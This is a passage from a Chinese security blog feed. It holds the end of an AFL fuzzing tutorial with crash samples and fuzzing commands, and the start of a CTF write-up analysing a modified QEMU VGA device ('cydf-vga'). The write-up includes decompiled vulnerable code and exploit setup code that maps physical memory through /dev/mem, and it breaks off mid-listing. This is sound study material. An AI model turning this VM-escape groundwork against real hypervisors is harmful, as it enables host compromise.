id:000002,sig:11,src:000000,op:flip1,pos:1  </span><br><span class="line">00000000: 7425 7374                                t%st</span><br></pre></td></tr></table></figure><p>这里应该是格式化字符串漏洞引起的crash</p><h4 id="id-000003-sig-11-src-000000-op-havoc-rep-64样例"><a href="#id-000003-sig-11-src-000000-op-havoc-rep-64样例" class="headerlink" title="id:000003,sig:11,src:000000,op:havoc,rep:64样例"></a><strong>id:000003,sig:11,src:000000,op:havoc,rep:64样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000003,sig:11,src:000000,op:havoc,rep:64 </span><br><span class="line">00000000: 4662 4062 4040 0000 8040 7f40 1000 4040  Fb@b@@...@.@..@@</span><br><span class="line">00000010: 6240 4000 7740 407f 4040 8040 403f 6565  b@@.w@@.@@.@@?ee</span><br><span class="line">00000020: 6565 4044 4040 3340 403f 6565 6565 4040  ee@D@@3@@?eeee@@</span><br><span class="line">00000030: 4040 3340 4040 4040 40                   @@3@@@@@@</span><br></pre></td></tr></table></figure><p>这里应该是以F开头且长度为6引起的crash</p><h4 id="id-000004-sig-11-src-000002-op-havoc-rep-8样例"><a href="#id-000004-sig-11-src-000002-op-havoc-rep-8样例" class="headerlink" title="id:000004,sig:11,src:000002,op:havoc,rep:8样例"></a><strong>id:000004,sig:11,src:000002,op:havoc,rep:8样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000004,sig:11,src:000002,op:havoc,rep:8  </span><br><span class="line">00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000010: 4141 4141 1e41 4141 4141 4141 4141 4132  AAAA.AAAAAAAAAA2</span><br><span class="line">00000020: 4141 4141 4141 1e41 4141 4141 4141 4141  AAAAAA.AAAAAAAAA</span><br><span class="line">00000030: 4141 4141 4141 4141 4141 4141 412a 4134  AAAAAAAAAAAAA*A4</span><br><span class="line">00000040: 41b8                                     A.</span><br></pre></td></tr></table></figure><p>这里应该是以A开头并且长度为66引起的crash</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以看到上面五个样例基本覆盖了源码中存在的漏洞。</p><h2 id="黑盒下的FUZZ"><a href="#黑盒下的FUZZ" class="headerlink" title="黑盒下的FUZZ"></a>黑盒下的FUZZ</h2><blockquote><p>  黑盒模式需要使用qemu_mode，所以最好从开始就使用源码进行编译，这里可能会出现很多问题，大多都可以在网上搜到解决办法</p></blockquote><p>这里直接使用以下命令进行编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g ./test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="开始FUZZ-1"><a href="#开始FUZZ-1" class="headerlink" title="开始FUZZ"></a>开始FUZZ</h3><p>这里的FUZZ选项略有不同，需要加上-Q选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i ./input_dir -o ./output_dir -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318141300808.png"                      alt="image-20230318141300808"                ></p><p>虽然可以看到这里被保存的crashes有6个，比上面的还多一个，但是看total crashes远远少于上面的。可以看出来用qemu的性能远远小于插桩的。</p><p>这里就不再分析输出的crashes文件了。</p><h2 id="文件读取输入的情况"><a href="#文件读取输入的情况" class="headerlink" title="文件读取输入的情况"></a>文件读取输入的情况</h2><p>首先做以下准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  input_dir mkdir file</span><br><span class="line">➜  input_dir cp ../../testcases/others/elf/small_exec.elf ./file</span><br><span class="line">➜  afl_test cp /usr/bin/readelf ./</span><br></pre></td></tr></table></figure><p>随后直接进行fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../afl-fuzz -i ./input_dir/file -o ./output_dir -Q ./readelf -a @@</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318142936126.png"                      alt="image-20230318142936126"                >跑了十分钟一次crash都没有的，当然跑再久应该也是一样的，这里就不再继续跑了。</p><hr><p>参考资料:<br>    <a class="link"   href="https://xz.aliyun.com/t/4314" >https://xz.aliyun.com/t/4314<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://www.cjovi.icu/fuzzing/1138.html" >https://www.cjovi.icu/fuzzing/1138.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。&lt;/p&gt;
&lt;h2 id=&quot;AFL-FUZZ介绍&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>q-escape</title>
    <link href="https://cv196082.gitee.io/2023/03/15/q-escape/"/>
    <id>https://cv196082.gitee.io/2023/03/15/q-escape/</id>
    <published>2023-03-15T08:45:50.000Z</published>
    <updated>2023-03-18T06:32:16.260Z</updated>
    
    <content type="html"><![CDATA[<p>许久没有更新，前段时间一直考试所以一直拖着了。</p><h2 id="设备分析"><a href="#设备分析" class="headerlink" title="设备分析"></a>设备分析</h2><p>首先看看开了什么保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  q-escape checksec --file=./qemu-system-x86_64 </span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>没有开启PIE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-m 64 \</span><br><span class="line">-initrd ./initramfs.igz \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-36-generic \</span><br><span class="line">-append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">-nographic \</span><br><span class="line">-L ./pc-bios \</span><br><span class="line">-vga std \</span><br><span class="line">-device cydf-vga \</span><br><span class="line">-monitor telnet:127.0.0.1:2222,server,nowait</span><br></pre></td></tr></table></figure><p>设备名为<code>cydf-vga</code>并且允许连接。</p><p>将qemu-system-x86_64拖入ida中，查找与设备cydf-vga相关的函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315122813653.png"                      alt="image-20230315122813653"                ></p><p>先分析cydf_vga_class_init初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cydf_vga_class_init</span><span class="params">(ObjectClass_0 *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rbx</span></span><br><span class="line">  PCIDeviceClass *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3223</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3224</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3-&gt;realize = pci_cydf_vga_realize;</span><br><span class="line">  v3-&gt;romfile = <span class="string">&quot;vgabios-cydf.bin&quot;</span>;</span><br><span class="line">  v3-&gt;vendor_id = <span class="number">0x1013</span>;</span><br><span class="line">  v3-&gt;device_id = <span class="number">0xB8</span>;</span><br><span class="line">  v3-&gt;class_id = <span class="number">0x300</span>;</span><br><span class="line">  v2-&gt;parent_class.desc = <span class="string">&quot;Cydf CLGD 54xx VGA&quot;</span>;</span><br><span class="line">  v2-&gt;parent_class.categories[<span class="number">0</span>] |= <span class="number">0x20</span>uLL;</span><br><span class="line">  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;</span><br><span class="line">  v2-&gt;parent_class.props = pci_vga_cydf_properties;</span><br><span class="line">  v2-&gt;parent_class.hotpluggable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>device_id</code>为0xB8，<code>vendor_id</code>为0x1013，<code>class_id</code>为0x300。并且可以看到父类的描述为<code>Cydf CLGD 54xx VGA</code>。合理猜测是根据原本的改的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  display git:(master) grep -r <span class="string">&#x27;CLGD 54xx VGA&#x27;</span> ./ </span><br><span class="line">./cirrus_vga_rop.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga_isa.c: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_internal.h: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_rop2.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c:    dc-&gt;desc = <span class="string">&quot;Cirrus CLGD 54xx VGA&quot;</span>;</span><br></pre></td></tr></table></figure><p>事实也是这样的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lspci</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0300: 1013:00b8 &lt;-- cydf_vga</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fa000000 0x00000000fbffffff 0x0000000000042208</span><br><span class="line">0x00000000febc1000 0x00000000febc1fff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febb0000 0x00000000febbffff 0x0000000000046200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>通过这里可以看到三个mmio空间。通过交叉引用，可以找到哪里注册了IO</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134309905.png"                      alt="image-20230315134309905"                ></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, <span class="string">&quot;cydf-io&quot;</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, <span class="string">&quot;cydf-low-memory&quot;</span>, <span class="number">0x20000</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, <span class="string">&quot;cydf-mmio&quot;</span>, <span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure><p>这里关注与cydf相关的空间注册，根据大小来看第一个就是pmio，只不过在resource文件内没有范围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/ioports </span></span><br><span class="line">0000-0cf7 : PCI Bus 0000:00</span><br><span class="line">  0000-001f : dma1</span><br><span class="line">  0020-0021 : pic1</span><br><span class="line">  0040-0043 : timer0</span><br><span class="line">  0050-0053 : timer1</span><br><span class="line">  0060-0060 : keyboard</span><br><span class="line">  0064-0064 : keyboard</span><br><span class="line">  0070-0071 : rtc0</span><br><span class="line">  0080-008f : dma page reg</span><br><span class="line">  00a0-00a1 : pic2</span><br><span class="line">  00c0-00df : dma2</span><br><span class="line">  00f0-00ff : fpu</span><br><span class="line">  0170-0177 : 0000:00:01.1</span><br><span class="line">    0170-0177 : ata_piix</span><br><span class="line">  01f0-01f7 : 0000:00:01.1</span><br><span class="line">    01f0-01f7 : ata_piix</span><br><span class="line">  0376-0376 : 0000:00:01.1</span><br><span class="line">    0376-0376 : ata_piix</span><br><span class="line">  03c0-03df : vga+</span><br><span class="line">  03f6-03f6 : 0000:00:01.1</span><br><span class="line">    03f6-03f6 : ata_piix</span><br><span class="line">  03f8-03ff : serial</span><br><span class="line">  0510-051b : QEMU0002:00</span><br><span class="line">  0600-063f : 0000:00:01.3</span><br><span class="line">    0600-0603 : ACPI PM1a_EVT_BLK</span><br><span class="line">    0604-0605 : ACPI PM1a_CNT_BLK</span><br><span class="line">    0608-060b : ACPI PM_TMR</span><br><span class="line">  0700-070f : 0000:00:01.3</span><br><span class="line">0cf8-0cff : PCI conf1</span><br><span class="line">0d00-ffff : PCI Bus 0000:00</span><br><span class="line">  afe0-afe3 : ACPI GPE0_BLK</span><br><span class="line">  c000-c03f : 0000:00:03.0</span><br><span class="line">  c040-c04f : 0000:00:01.1</span><br><span class="line">    c040-c04f : ata_piix</span><br></pre></td></tr></table></figure><p>可以看到这里存在一个大小刚好为0x30的vga+的端口范围。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134724201.png"                      alt="image-20230315134724201"                ></p><p>根据定义的函数来看我们还需要找到vga的映射空间，通过这篇文章<a class="link"   href="http://www.osdever.net/FreeVGA/vga/vgamem.htm" >vgamem<i class="fas fa-external-link-alt"></i></a>可以得知vga的映射空间为<code>000a0000-000bffff</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/iomem </span></span><br><span class="line">00000000-00000fff : Reserved</span><br><span class="line">00001000-0009fbff : System RAM</span><br><span class="line">0009fc00-0009ffff : Reserved</span><br><span class="line">000a0000-000bffff : PCI Bus 0000:00</span><br><span class="line">000c0000-000c97ff : Video ROM</span><br><span class="line">000c9800-000ca5ff : Adapter ROM</span><br><span class="line">000ca800-000cadff : Adapter ROM</span><br><span class="line">000f0000-000fffff : Reserved</span><br><span class="line">  000f0000-000fffff : System ROM</span><br><span class="line">00100000-03fdffff : System RAM</span><br><span class="line">  01000000-01c031d0 : Kernel code</span><br><span class="line">  01c031d1-0266a03f : Kernel data</span><br><span class="line">  028e2000-02b3dfff : Kernel bss</span><br><span class="line">03fe0000-03ffffff : Reserved</span><br><span class="line">04000000-febfffff : PCI Bus 0000:00</span><br><span class="line">  fa000000-fbffffff : 0000:00:04.0</span><br><span class="line">  fc000000-fcffffff : 0000:00:02.0</span><br><span class="line">  feb40000-feb7ffff : 0000:00:03.0</span><br><span class="line">  feb80000-feb9ffff : 0000:00:03.0</span><br><span class="line">  febb0000-febbffff : 0000:00:04.0</span><br><span class="line">  febc0000-febc0fff : 0000:00:02.0</span><br><span class="line">  febc1000-febc1fff : 0000:00:04.0</span><br><span class="line">fec00000-fec003ff : IOAPIC 0</span><br><span class="line">fed00000-fed003ff : HPET 0</span><br><span class="line">  fed00000-fed003ff : PNP0103:00</span><br><span class="line">fee00000-fee00fff : Local APIC</span><br><span class="line">fffc0000-ffffffff : Reserved</span><br><span class="line">100000000-17fffffff : PCI Bus 0000:00</span><br></pre></td></tr></table></figure><p>通过注册的大小和所看到的其实地址可以确定是这里<code>000a0000-000bffff : PCI Bus 0000:00</code>。</p><p>并且在源码中也有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***************************************</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  memory access between 0xa0000-0xbffff</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> ***************************************/</span></span><br></pre></td></tr></table></figure><p>可以看到<code>vga_mem</code>空间在resource文件中并不存在，所以无法像前面一道题一样使用resource0文件去访问内存了。这时我们可以利用<code>/dev/mem</code>文件，<code>dev/mem</code>是物理内存的全映像，可以用来访问物理内存，用mmap来访问物理内存以及外设的IO资源，是实现用户空间驱动的一种方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"><span class="keyword">int</span> fd = open( <span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC );</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xfebc1000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !mmio_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap mmio failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vga_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x20000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xa0000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !vga_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>根据上一道题的流程来看，这里需要分析分析结构体了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315135737136.png"                      alt="image-20230315135737136"                ></p><p>在对比两个结构体的结果发现了源文件中不存在<code>VulnState_0 vs[16];uint32_t latch[4];</code>这样两个属性。并且还明显的说了是<code>VulnState_0</code>。通过源码对比发现，源码中考虑地址的情况只有<code>addr &lt; 0x10000</code>，<code>addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100</code></p><p>但是这里存在一个新的，也就是大于<code>0x18100</code>的情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">v5 = opaque-&gt;vga.sr[<span class="number">0xCC</span>] % <span class="number">5u</span>;</span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)&amp;opaque-&gt;vga.sr[<span class="number">0xCD</span>] )</span><br><span class="line">  LODWORD(mem_value) = (opaque-&gt;vga.sr[<span class="number">0xCD</span>] &lt;&lt; <span class="number">16</span>) | (opaque-&gt;vga.sr[<span class="number">0xCE</span>] &lt;&lt; <span class="number">8</span>) | mem_value;</span><br><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = BYTE2(mem_value);</span><br><span class="line">  <span class="keyword">if</span> ( v21 &lt;= <span class="number">0x10</span> &amp;&amp; opaque-&gt;vs[v21].buf )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">0x4CF9</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;= *((_DWORD *)v6 + <span class="number">0x4CF8</span>) )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      LABEL_26:</span><br><span class="line">      *((_DWORD *)v6 + <span class="number">0x4CF9</span>) = v8 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v7 + v8) = mem_value;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">19705</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt; <span class="number">0xFFF</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    LABEL_35:</span><br><span class="line">    v17 = vulncnt;</span><br><span class="line">    <span class="keyword">if</span> ( vulncnt &lt;= <span class="number">0x10</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      mem_valuea = mem_value;</span><br><span class="line">      v18 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> 